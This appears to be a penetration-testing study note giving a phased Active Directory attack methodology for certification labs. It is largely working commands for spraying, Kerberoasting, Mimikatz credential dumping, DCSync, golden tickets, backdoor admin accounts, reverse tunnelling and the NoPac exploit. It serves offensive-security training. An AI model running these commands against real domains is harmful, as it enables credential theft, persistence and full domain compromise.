# Active Directory Methodology

Part of [[METHODOLOGY CHEAT SHEET]]. AD enumeration → password attacks → lateral movement → post-exploitation/persistence, phase-ordered. See also [[03_ACTIVE_DIRECTORY_BIBLE]] for deeper AD attack-path material.

---

### Phase 1: AD Enumeration

#### Step 1: Basic Domain Information
```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetDomainController

# Manual LDAP
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = $domainObj.PdcRoleOwner.Name
$DN = ([adsi]'').distinguishedName
$LDAP = "LDAP://$PDC/$DN"
```

#### Step 2: Users & Groups
```powershell
# PowerView
Get-NetUser
Get-NetUser | select cn,lastlogon,pwdlastset
Get-NetGroup
Get-NetGroup "Domain Admins" | select member

# net.exe
net user /domain
net group /domain
net group "Domain Admins" /domain
```

#### Step 3: Computers
```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname

# SMB enumeration
crackmapexec smb <target> -u user -p password --shares
```

#### Step 3.5: Domain Shares & SYSVOL

```powershell
# Enumerate all shares across the domain
Find-DomainShare
Find-DomainShare -CheckShareAccess    # only shares readable by current user

# SYSVOL is readable by all domain users — always check it
ls \\dc1.corp.com\sysvol\corp.com\Policies\
```

```cmd
:: Search SYSVOL for GPP cpassword fields (old Group Policy Preferences passwords)
findstr /S /I "cpassword" \\dc1.corp.com\sysvol\corp.com\
```

```bash
# Decrypt on Kali
gpp-decrypt "<cpassword_base64>"
```

Key things to look for in shares:
- `cpassword` in any XML under SYSVOL (GPP passwords. AES key is public, decryptable)
- Config files, scripts, `.txt` files with credentials in custom shares (docshare, Users, backup)
- Folders named "do-not-share", almost always misconfigured and very much shared

Full reference: [[Active Directory Introduction and Enumeration#22.3.5 Enumerating Domain Shares|Module 22 §22.3.5]]

#### Step 4: Service Principal Names (SPNs)
```powershell
Get-NetUser -SPN | select samaccountname,serviceprincipalname

# SetSPN
setspn -L <user>
```

#### Step 5: Active Sessions & Local Admin
```powershell
Find-LocalAdminAccess    # sprays every machine in domain via SCM OpenServiceW — noisy, generates events
Get-NetSession -ComputerName <target>    # blocked on Win10 1709+/Server 2019+ for non-admins by default

# PsLoggedOn (requires Remote Registry service on target — enabled by default on servers, disabled on workstations)
.\PsLoggedon.exe \\<target>
```

> Key lesson: on modern Windows, `Get-NetSession` returns Access Denied rather than sessions. Use `-Verbose` to distinguish "no sessions" from "access denied". Use PsLoggedOn as the fallback.
>
> After Find-LocalAdminAccess finds a machine you have admin on: if a high-value user (e.g. Domain Admin) is logged in there (via PsLoggedOn), that machine is your credential theft target.
>
> **UAC token filtering gotcha**: when you RDP to a machine as a domain user who is a local admin, the session has a filtered token, direct paths like `C:\Users\Administrator\Desktop\` are access denied. Use UNC admin shares from a different machine instead: `type "\\target\c$\Users\administrator\Desktop\proof.txt"`

#### Step 6: Permissions
```powershell
Get-ObjectAcl -Identity <user>
Find-InterestingDomainAcl
```

#### Step 7: BloodHound
```powershell
# Collect data
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\

# Or use SharpHound.exe
SharpHound.exe -c All -d domain.com

# Import to BloodHound on Kali
# Start Neo4j
sudo neo4j start
# Start BloodHound
bloodhound
# Upload .zip file
```

**Key BloodHound Queries**:
```cypher
// All computers
MATCH (m:Computer) RETURN m

// All users
MATCH (m:User) RETURN m

// Active sessions
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p

// Shortest path to Domain Admins
// Pre-built query in BloodHound

// CanPSRemote — who can WinRM into what
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer)
RETURN p2

// SQLAdmin — who has SQL admin rights on which host
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group))
MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer)
RETURN p2
```

**bloodhound-python — Remote collection from Kali (no WinRM/RDP needed):**
```bash
pip3 install bloodhound
bloodhound-python -d DOMAIN.LOCAL -u user -p pass -ns <DC_IP> -c all
zip -r bh_data.zip *.json   # then import zip into BloodHound GUI
```

#### Step 8: ACL Enumeration

```powershell
# Get current user's SID
$sid = Convert-NameToSid <username>

# Find ACEs where the current user has interesting rights on other objects
# -ResolveGUIDs translates GUIDs to human-readable names (always use this)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
# Key fields: ObjectDN, AceType, ActiveDirectoryRights, ObjectAceType

# Scope to a specific OU to avoid timing out on large domains
Get-DomainObjectACL -ResolveGUIDs -Identity * -domain DOMAIN.LOCAL \
  -SearchBase "LDAP://OU=Users,DC=DOMAIN,DC=LOCAL"
```

Exploitable ACE types:
- `GenericAll` = full control (password reset, add to group, set SPN)
- `GenericWrite` = write attributes (set SPN for targeted Kerberoast)
- `User-Force-Change-Password` = reset password without knowing current
- `Self-Membership` = add yourself to a group
- `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` = DCSync

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.9. ACL Enumeration|AD.9]]

#### Step 9: SPN / Kerberoast Candidate Discovery

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Windows built-in (no tools required)
setspn -Q */*
```

#### Step 10: UAC Flag Hunting

```powershell
# Accounts with no pre-auth (AS-REP Roasting candidates)
Get-DomainUser -PreauthNotRequired

# Accounts with PASSWD_NOTREQD (blank password possible)
Get-DomainUser -UACFilter PASSWD_NOTREQD

# Accounts with reversible encryption (cleartext derivable from DCSync)
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'}
```

#### Step 11: Snaffler Domain-Wide Credential Hunt

```cmd
:: From domain-joined Windows machine (domain-aware share crawl)
Snaffler.exe -d DOMAIN.LOCAL -s -v data
```

Full reference: [[Password Attacks (HTB Supplementary)#PA.17.4. Snaffler. Automated Interesting-File Finder|PA.17.4]] (per-host), [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.7.2. Snaffler Domain-Wide Scan|AD.7.2]] (domain-wide)

---

### Phase 2: Initial Access

#### Step 1: Username Enumeration (before spraying)

If you don't have a confirmed username list yet, generate candidates first:
```bash
# Generate username formats from a name list (first.last, f.last, flast, etc.)
username-anarchy -i names.txt > candidate_users.txt

# Validate candidates against Kerberos WITHOUT triggering lockouts
kerbrute userenum -d <domain> --dc <DC-IP> candidate_users.txt
# Also try standard wordlists:
kerbrute userenum -d <domain> --dc <DC-IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```
Valid usernames returned by kerbrute (Kerberos says "pre-auth required" vs "no such user") are safe to spray.

Full reference: [[Password Attacks (HTB Supplementary)#PA.20 kerbrute. Kerberos Username Enumeration & Spray|PA.20]], [[Password Attacks (HTB Supplementary)#PA.21 username-anarchy|PA.21]]

#### Tags: #kerbrute #usernameAnarchy #ADEnumeration #HTBSupplementary

---

#### Step 1.5: Password Policy (before spraying — critical)

```bash
# From Linux, authenticated
crackmapexec smb <DC_IP> -u user -p pass --pass-pol
# → [+] Minimum password length: 8 | Lockout threshold: 5 attempts

# From Linux, rpcclient
rpcclient -U "DOMAIN\\user%pass" <DC_IP> -c "getdompwinfo"
# → minPasswordLength: 8

# From Windows, PowerView
(Get-DomainPolicy)."system access"
# → MinimumPasswordLength = 8; LockoutBadCount = 5
```

Default Windows domain minimum: **7 characters** (no custom policy applied). Lockout threshold of 0 = no lockout, spray freely.

#### Step 1.6: LLMNR/NBT-NS Poisoning from Windows (Inveigh)

When you have a Windows foothold and can't run Responder from Kali:
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
# Captures NTLMv2 hashes from the local network segment
# Ctrl+C to stop; read captures: type Inveigh-NTLMv2.txt
```

Crack captures with `hashcat -m 5600`. Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.3. LLMNR/NBT-NS Poisoning from Windows. Inveigh|AD.3]]

#### Step 2: Password Spraying

**Password Spraying**:
```bash
# CrackMapExec / NetExec
crackmapexec smb <target> -u users.txt -p passwords.txt --continue-on-success
nxc smb <target> -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute (Kerberos — faster, less log noise than SMB spray)
kerbrute passwordspray -d domain.com --dc <dc_ip> users.txt "Password123!"

# Hydra (for RDP/WinRM where Kerberos isn't the auth path)
hydra -L users.txt -P rockyou.txt rdp://<target> -t 1
```

**From Windows foothold — Spray-Passwords.ps1 (LDAP/ADSI — low noise):**
```powershell
cd C:\Tools; powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin    # -Admin includes admin accounts
# Look for: Guessed password for user: 'pete' = 'Nexus123!'
```

**From Windows foothold — DomainPasswordSpray.ps1 (pulls user list from AD automatically):**
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
```

> Module 23 lesson: crackmapexec -u pete spray across all subnet IPs reveals (Pwn3d!) where pete is local admin. Use `--continue-on-success` and spray a whole subnet: one valid cred might give local admin on a box the sprayer didn't expect.

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.5. Password Spraying from Windows. DomainPasswordSpray|AD.5]], [[Attacking Active Directory Authentication#23.2.1 Password Attacks (Spraying)|Module 23 §23.2.1]]

#### Step 3: AS-REP Roasting
```bash
# Rubeus
Rubeus.exe asreproast /nowrap

# impacket
impacket-GetNPUsers -dc-ip <dc_ip> -request -outputfile hashes.asreproast domain.com/user

# Crack
hashcat -m 18200 hashes.asreproast rockyou.txt --force
```

#### Step 4: Kerberoasting
```bash
# Rubeus (from domain-joined Windows with AD session — NOT over evil-winrm: WinRM auth is NTLM, no TGT exists)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast /nowrap

# impacket (from Kali — preferred when evil-winrm is your only shell)
impacket-GetUserSPNs -request -dc-ip <dc_ip> domain.com/user -outputfile hashes.kerberoast

# Crack
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

> Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN immediately (large offset kills the OpenVPN TLS session) → run impacket. See [[feedback-oscp-kerberos-clock-sync]].
>
> Rubeus over evil-winrm fails with "No credentials are available in the security package", evil-winrm authenticates via NTLM so there's no Kerberos TGT in the session. Use impacket from Kali instead.

#### Step 5: Pass-the-Hash
```bash
# impacket
impacket-psexec -hashes :<ntlm_hash> domain/user@<target>
impacket-wmiexec -hashes :<ntlm_hash> domain/user@<target>

# CrackMapExec / NetExec
crackmapexec smb <target> -u user -H <ntlm_hash>
nxc smb <target> -u user -H <ntlm_hash>

# smbclient
smbclient \\\\<target>\\share -U user --pw-nt-hash <ntlm_hash>

# RDP (requires DisableRestrictedAdmin=0 on target)
xfreerdp /v:<target> /u:user /pth:<ntlm_hash>
```

#### Step 6: Overpass-the-Hash
```cmd
# Mimikatz
sekurlsa::pth /user:user /domain:domain.com /ntlm:<ntlm_hash> /run:powershell

# In new PowerShell session
net use \\fileserver
```

#### Step 7: Pass-the-Certificate (when you have write access to an AD computer object)

Requires: GenericWrite or WriteProperty on a machine account's `ms-DS-KeyCredentialLink` attribute.
```bash
# 1. Add shadow credential to the machine account
python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <machine$> --action add
# Note the pfx filename and password printed by pywhisker

# 2. Get TGT via PKINIT (oscrypto pin may be needed first: pip3 install oscrypto==1.3.0)
python3 gettgtpkinit.py <domain>/<machine$> out.ccache -cert-pfx <pfx-file> -pfx-pass <pfx-pass>

# 3. Use the TGT
export KRB5CCNAME=out.ccache
evil-winrm -i <target> -r <domain>         # WinRM
smbclient -k -N //<target>/share           # SMB with Kerberos
```
Full reference: [[Password Attacks (HTB Supplementary)#PA.17 Pass the Certificate (PtC)|PA.17]], [[Secrets & Credentials (Decision Tree)#Got write access to an AD computer object|Decision Tree]]

#### Tags: #PassTheCertificate #PtC #pywhisker #PKINITtools #HTBSupplementary

---

### Phase 3: Post-Exploitation & Persistence

#### Step 1: Extract Credentials

**Mimikatz**:
```cmd
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::dcsync /user:domain\user
```

**DCSync**:
```cmd
lsadump::dcsync /user:domain\krbtgt
```

**Hash Dumping**:
```bash
# impacket (remote)
impacket-secretsdump domain/user:password@<dc_ip>
impacket-secretsdump -sam sam.bak -security security.bak -system system.bak LOCAL

# NetExec one-liners (no shell needed, just creds)
nxc smb <target> -u user -p pass --sam
nxc smb <target> -u user -p pass --lsa
nxc smb <dc_ip>  -u user -p pass --ntds
```

**Snaffler** (share and file credential hunting, run from domain-joined machine):
```cmd
.\Snaffler.exe -d <domain> -o snaffler_output.log -v data
```
Finds credentials in readable shares: configs, scripts, backup files, .git repos, etc.

**NTDS.dit via Volume Shadow Copy** (DC access, avoids file lock):
```cmd
vssadmin CREATE SHADOW /For=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\
```
Then exfil + crack: `impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL`

#### Step 2: Pass-the-Ticket

**Windows (kirbi files):**
```cmd
# Export tickets from current session
sekurlsa::tickets /export

# Import a .kirbi ticket into the current session
kerberos::ptt ticket.kirbi

# Verify
klist
```

**Linux (ccache files):**
```bash
# Find existing ccache files
ls -la /tmp/krb5cc_*

# Activate one
export KRB5CCNAME=/tmp/krb5cc_<id>

# Or extract from a .keytab
python3 keytabextract.py <file.keytab>
kinit <user>@DOMAIN -k -t <file.keytab>

# Use it
smbclient -k -N //<target>/share
```
Full reference: [[Password Attacks (HTB Supplementary)#PA.15 Pass the Ticket. Windows|PA.15]], [[Password Attacks (HTB Supplementary)#PA.16 Pass the Ticket. Linux|PA.16]]

#### Step 3: Golden Ticket
```cmd
# Get krbtgt hash
lsadump::dcsync /user:domain\krbtgt

# Create golden ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Access DC
PsExec \\dc1 cmd
```

#### Step 4: Silver Ticket
```cmd
# Create service ticket
kerberos::golden /user:<user> /domain:domain.com /sid:<domain_sid> /target:<server.domain.com> /service:<service> /rc4:<service_hash> /ptt

# Access service
iwr -UseDefaultCredentials http://<server>
```

#### Step 5: Backdoor Accounts
```cmd
# Create backdoor user
net user backdoor password /add /domain
net group "Domain Admins" backdoor /add /domain

# AWS (cloud)
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

---

### Phase 4: Lateral Movement

#### Step 1: Service Exploitation

**PsExec**:
```cmd
PsExec64.exe \\<target> -u domain\user -p password cmd
```

**WMI**:
```cmd
wmic /node:<target> /user:domain\user /password:pass process call create "cmd.exe /c whoami > C:\temp\out.txt"
```

**PowerShell Remoting**:
```powershell
$cred = Get-Credential
Enter-PSSession -ComputerName <target> -Credential $cred
```

**WinRM**:
```cmd
winrs -r:<target> -u:user -p:pass "whoami"
evil-winrm -i <target> -u user -p password
```

**Impacket**:
```bash
impacket-psexec domain/user:password@<target>
impacket-wmiexec domain/user:password@<target>
```

#### Step 2: Pivoting

**SSH Tunneling**:
```bash
# Local port forward
ssh -L 8080:internal_host:80 user@jump_host

# Dynamic SOCKS
ssh -D 1080 user@jump_host

# Remote port forward
ssh -R 8080:localhost:80 user@external_host
```

**Metasploit**:
```bash
# Add route
route add 172.16.0.0 255.255.255.0 1

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j
```

**Chisel**:
```bash
# Server
./chisel server --port 8080 --reverse

# Client
./chisel client <attacker_ip>:8080 R:socks
```

**Proxychains**:
```bash
# /etc/proxychains4.conf
socks5 127.0.0.1 1080

# Usage
proxychains nmap -sT 172.16.0.0/24
proxychains crackmapexec smb 172.16.0.0/24 -u user -p password
```

---

### Phase 3 (additions)

#### Step 5: ACL Abuse Chain

When you find exploitable ACEs (from Phase 1 Step 8 enumeration), the PSCredential pattern lets you chain multi-hop abuse:

```powershell
# Build credential object for the account you've compromised
$passwd = ConvertTo-SecureString "plaintext" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\user', $passwd)

# ForceChangePassword ACE: reset target's password
$newPass = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target_user> -AccountPassword $newPass -Credential $Cred -Verbose

# GenericAll/Self-Membership ACE: add user to a group
$Cred2 = New-Object System.Management.Automation.PSCredential('DOMAIN\<target_user>', $newPass)
Add-DomainGroupMember -Identity 'Privileged Group' -Members '<target_user>' -Credential $Cred2 -Verbose

# GenericWrite/GenericAll ACE: set SPN for targeted Kerberoasting
Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
# Then Kerberoast: .\Rubeus.exe kerberoast /user:<high_value_user> /nowrap
# Cleanup: Set-DomainObject -Credential $Cred2 -Identity <high_value_user> -Clear serviceprincipalname
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.10. ACL Abuse Chain|AD.10]]

#### Step 6: DCSync with runas /netonly (non-domain machine)

When you're not on a domain-joined machine but have domain credentials with DS-Replication rights:
```cmd
rem Spawn cmd with network auth as the domain user
runas /netonly /user:DOMAIN\user "cmd.exe"
```

Then inside the new cmd, run mimikatz:
```mimikatz
lsadump::dcsync /domain:DOMAIN.LOCAL /user:DOMAIN\krbtgt
```

For accounts with reversible encryption (ENCRYPTED_TEXT_PWD_ALLOWED), cleartext appears in DCSync output.

---

### Phase 5: Domain Trust Attacks

#### Step 1: Enumerate Trusts

```powershell
# PowerView
Get-DomainTrustMapping
# Shows: SourceName, TargetName, TrustType (WITHIN_FOREST/FOREST_TRANSITIVE), TrustDirection

# Windows built-in
netdom query /domain:DOMAIN.LOCAL trust
```

Trust types:
- `WITHIN_FOREST` = child-parent, SID filtering NOT applied. ExtraSids attack works.
- `FOREST_TRANSITIVE` = cross-forest, SID filtering applied. Only Kerberoasting/credential reuse.

#### Step 2: Child→Parent Escalation (ExtraSids Golden Ticket)

From a compromised child domain:
```powershell
# Get child domain SID
Get-DomainSID   # → S-1-5-21-CHILD...

# Get Enterprise Admins SID from parent
Get-DomainObject -Identity "Enterprise Admins" -Domain PARENT.DOMAIN.LOCAL
# → ObjectSID: S-1-5-21-PARENT...-519
```

```mimikatz
# DCSync the child KRBTGT
lsadump::dcsync /user:CHILD\krbtgt
```

```cmd
rem Forge golden ticket with ExtraSids (parent Enterprise Admins SID injected)
.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:CHILD.PARENT.LOCAL ^
  /sid:<CHILD_DOMAIN_SID> /sids:<ENTERPRISE_ADMINS_SID> /user:hacker /ptt
klist
rem Verify: ls \\parentdc.parent.local\c$
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.16. Child→Parent Trust Attack (Windows. ExtraSids)|AD.16]]

**Linux — raiseChild.py (automated):**
```bash
impacket-raiseChild -target-exec DC01.PARENT.LOCAL CHILD.PARENT.LOCAL/Administrator:pass
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.17. Child→Parent Trust Attack (Linux, raiseChild.py)|AD.17]]

#### Step 3: Cross-Forest Kerberoasting

```cmd
rem Windows: Rubeus with /domain: for external forest
.\Rubeus.exe kerberoast /domain:FOREIGN.FOREST.LOCAL /rc4opsec /nowrap
```

```bash
# Linux: GetUserSPNs.py with -target-domain
GetUserSPNs.py -target-domain FOREIGN.FOREST.LOCAL OUROWN.LOCAL/user:pass -dc-ip <DC_IP> -request
# Crack with hashcat -m 13100
# Use cracked credentials: smbexec.py FOREIGN.FOREST.LOCAL/user:pass@<foreign_dc_ip>
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.18. Cross-Forest Trust Abuse (Windows)|AD.18]], [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.19. Cross-Forest Trust Abuse (Linux)|AD.19]]

---

### Bleeding Edge (CVE-based)

#### NoPac — CVE-2021-42278 + CVE-2021-42287

Any low-priv domain user can impersonate a DC and get SYSTEM:
```bash
# Scan first
python3 scanner.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap

# Exploit
python3 noPac.py DOMAIN.LOCAL/user:pass -dc-ip <DC_IP> -use-ldap \
  -shell --impersonate administrator
```

Full reference: [[Active Directory Enumeration & Attacks (HTB Supplementary)#AD.13. Bleeding Edge: NoPac (CVE-2021-42278 + CVE-2021-42287)|AD.13]]

---

#### Tags: #ActiveDirectory #ADEnum #ADAttacks #BloodHound #PowerView #Kerberoasting #ASREPRoasting #DCSync #GoldenTicket #PtH #PtT #PtC #ACLAbuse #DomainTrust #ExtraSids #NoPac #HTBSupplementary #Methodology
